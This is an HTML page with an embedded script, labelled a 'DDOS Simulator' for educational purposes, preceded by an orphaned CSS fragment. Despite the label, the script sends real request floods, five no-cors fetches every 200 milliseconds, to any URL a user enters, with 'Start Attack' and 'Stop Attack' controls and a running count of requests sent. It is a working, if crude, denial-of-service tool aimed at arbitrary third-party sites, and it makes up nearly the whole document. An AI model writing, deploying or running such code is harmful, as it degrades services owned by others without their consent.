  body {

    margin-top: 0;

    height: 180px;

<body>
  <h1>DDOS Simulator</h1>
  <p>Simulates multiple requests to a URL (for educational purposes only)</p>
  <input type="text" id="targetUrl" placeholder="Enter target URL" style="width: 90vw; max-width: 600px; padding: 12px; border-radius: 8px; border: none; font-size: 1em;" />
  <button id="startBtn">Start Attack</button>
  <div id="log" aria-live="polite" aria-atomic="true"></div>

  <script>
    const startBtn = document.getElementById('startBtn');
    const targetUrlInput = document.getElementById('targetUrl');
    const logDiv = document.getElementById('log');
    let attackInterval;
    let count = 0;
    let running = false;

    function log(message) {
      const now = new Date();
      const timestamp = now.toLocaleTimeString();
      logDiv.textContent = `[${timestamp}] ${message}\n` + logDiv.textContent;
    }

    function sendRequest(url) {
      fetch(url, {mode: 'no-cors'}).then(() => {
        count++;
        if (count % 10 === 0) {
          log(`Sent ${count} requests...`);
        }
      }).catch(() => {
        log('Request failed or blocked.');
      });
    }

    startBtn.addEventListener('click', () => {
      if (running) {
        clearInterval(attackInterval);
        running = false;
        startBtn.textContent = "Start Attack";
        log('Attack stopped.');
        return;
      }

      const url = targetUrlInput.value.trim();
      if (!url) {
        alert('Please enter a valid URL.');
        return;
      }

      count = 0;
      logDiv.textContent = '';
      log(`Starting attack on: ${url}`);
      running = true;
      startBtn.textContent = "Stop Attack";

      attackInterval = setInterval(() => {
        // Send 5 requests rapidly
        for (let i = 0; i < 5; i++) {
          sendRequest(url);
        }
      }, 200);
    });
  </script>
</body>
